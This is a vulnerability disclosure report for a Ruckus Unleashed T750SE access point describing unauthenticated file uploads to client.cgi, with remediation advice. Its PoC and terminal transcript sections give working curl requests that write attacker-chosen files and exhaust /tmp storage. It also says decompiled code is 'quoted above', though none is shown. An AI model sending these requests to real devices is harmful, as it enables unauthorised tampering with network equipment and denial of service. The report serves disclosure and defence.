# Ruckus T750SE 200.19.7.112.291 was discovered to contain an unauthenticated firmware and certificate upload vulnerability in client.cgi

## Overview

- Vendor: Ruckus/CommScope
- Product: Unleashed AP T750SE (image also used by T750/R750/R850/R650/R550)
- Version: 200.19.7.112.291
- Component: web/client.cgi, /upload/fw and /upload/cert
- Vulnerability Class: CWE-306 missing authentication / CWE-434 unrestricted upload
- Manufacturer: https://www.commscope.com/

## Affected version

- Firmware image.
- `client.cgi` and `webad` are the vendor binaries.

## Vulnerability details

`client.cgi` parses `/upload/fw` and `/upload/cert` multipart bodies and
writes them to `/tmp/apimage/rcks_fw.bl7` and `/tmp/cert-pkt-file` before
`webad`/session validation. There is no authentication, size limit, or file
type check. The `fw`/`upgrade_tool` path still verifies a SHA/signature, so
this report does not claim firmware RCE; the confirmed impact is fixed-path
staging-file write/overwrite and `/tmp` exhaustion.

## PoC

```sh
curl -sS -i -X POST \
  -F 'file=@marker.bin;filename=rcks_fw.bl7' \
  'http://<ap>/client.cgi?uri=/upload/fw'

# Certificate staging:
curl -sS -i -X POST \
  -F 'file=@marker.bin;filename=cert.pkt' \
  'http://<ap>/client.cgi?uri=/upload/cert'
```

## Reproduction and terminal evidence

Environment: qemu-arm user-mode with the firmware lighttpd + client.cgi;
no Cookie or session is sent.

Terminal transcript:

```
$ curl -sS -i -X POST -F 'file=@marker.bin;filename=rcks_fw.bl7' \
    'http://127.0.0.1:39124/client.cgi?uri=/upload/fw'
HTTP/1.1 302 Found
...
$ ls -l /tmp/apimage/rcks_fw.bl7
3023 bytes  (content: PREAUTH_UPLOAD_MARKER)

# 16 MiB body:
$ ls -l /tmp/apimage/rcks_fw.bl7
16777239 bytes
```

## Verification

The vulnerable handler in the stock `web/client.cgi, /upload/fw and /upload/cert` was decompiled from the unpacked rootfs (code quoted above), and the stock binary was run under qemu/FirmAE; the transcript is shown above.

## Impact

Unauthenticated fixed-path file write/overwrite in `/tmp`, possible
interference with the firmware/certificate staging flow, and disk/resource
exhaustion with large bodies. Firmware signature verification was not
bypassed; RCE not demonstrated.

## Remediation

- Require authentication/session validation before parsing multipart uploads.
- Enforce a strict size limit and store uploads outside fixed sensitive paths.
- Verify the firmware signature before exposing the staging file to any
  upgrade tool.

## Known CVE relation

- NVD 2026-11-06 has no T750SE `client.cgi` upload entry. Older
  CVE-2019-19838/19839 cover `emfd` uploadFile, a different component.

## Status and disclosure

Dynamic confirmation (no Cookie, firmware lighttpd + client.cgi). Candidate
0-day; CVE application in progress.

## Additional Information

```markdown
### Vendor
Ruckus/CommScope

### Product
Unleashed AP T750SE (image also used by T750/R750/R850/R650/R550)

### Version or Commit
200.19.7.112.291

### Vulnerability Class
CWE-306 missing authentication / CWE-434 unrestricted upload

### CVE_status
CVE application in progress

### Description
client.cgi parses /upload/fw and /upload/cert multipart bodies and writes them to /tmp/apimage/rcks_fw.bl7 and /tmp/cert-pkt-file before webad and session validation, with no authentication, size limit or file type check.

### Affected_component
web/client.cgi, /upload/fw and /upload/cert

### Attack_vector
Unauthenticated POST /upload/fw or /upload/cert with a multipart body.

### Product_version
Unleashed AP T750SE (image also used by T750/R750/R850/R650/R550) 200.19.7.112.291

### Reference
- https://www.commscope.com/
- https://github.com/vuln-1/vuln/blob/main/Ruckus/T750SE_V200.19.7.112.291/report-2.md
```
